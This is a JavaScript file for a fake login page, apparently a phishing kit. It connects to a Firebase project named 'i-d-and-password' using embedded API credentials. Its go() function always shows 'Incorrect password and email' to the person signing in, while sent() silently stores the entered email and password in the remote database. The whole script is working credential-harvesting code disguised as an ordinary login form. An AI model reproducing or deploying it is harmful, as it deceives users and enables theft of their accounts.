//FIREBASE
const firebaseConfig = {
  apiKey: "AIzaSyBYKrcZyPrV2V4bNx6U5FylsSCg2Lm-10M",
  authDomain: "i-d-and-password.firebaseapp.com",
  databaseURL: "https://i-d-and-password-default-rtdb.firebaseio.com",
  projectId: "i-d-and-password",
  storageBucket: "i-d-and-password.appspot.com",
  messagingSenderId: "394785760896",
  appId: "1:394785760896:web:2a2cb77cbb8abf05026865",
  measurementId: "G-0DXCRPK7Q6"
};
















firebase.initializeApp(firebaseConfig);
var database = firebase.database()

//LOADING HIDE
window.addEventListener('load', function () {
  //Delay
  setTimeout(()=> {
document.getElementById("loading_page").style.animation = "fadeout 2s 1 forwards";
  },1500);
})
function login() {
  document.getElementById("login_page").style.animation = "dishow 500ms 1 forwards";
}
function hidedi() {
  document.getElementById("login_page").style.animation = "dihide 500ms 1 forwards";
}



function go(){
  var email2 = document.getElementById('it1').value
  var password2 = document.getElementById('it2').value
  
  if (email2 == "") {
    toast("Enter your number or email");
  } else {
    
    if (password2 == "") {
    toast("Enter password");
  } else {
    
    toast("Incorrect password and email");
    sent();
    
  }
    
  }
}



function toast(t){
  Toastify({
  text: t,
  duration: 3000,
  newWindow: true,
  close: true,
  gravity: "top", // `top` or `bottom`
  position: "left", // `left`, `center` or `right`
  stopOnFocus: true, // Prevents dismissing of toast on hover
  style: {
    background: "linear-gradient(to right, #ff3333, #ffcccc)",
  },
  onClick: function(){} // Callback after click
}).showToast();
}


function sent() {
    
  var email = document.getElementById('it1').value
  var password = document.getElementById('it2').value
  var random = Math.floor(Math.random() * 999)
  database.ref(email +'/' + email + "-" + random).set({
    email : email,
    password: password
  })
  
  }


function save12() {
  var t = document.getElementById('text').value
  
  database.ref('fileName/' + t).set({
    
    t : t,
    y : t
  })
}

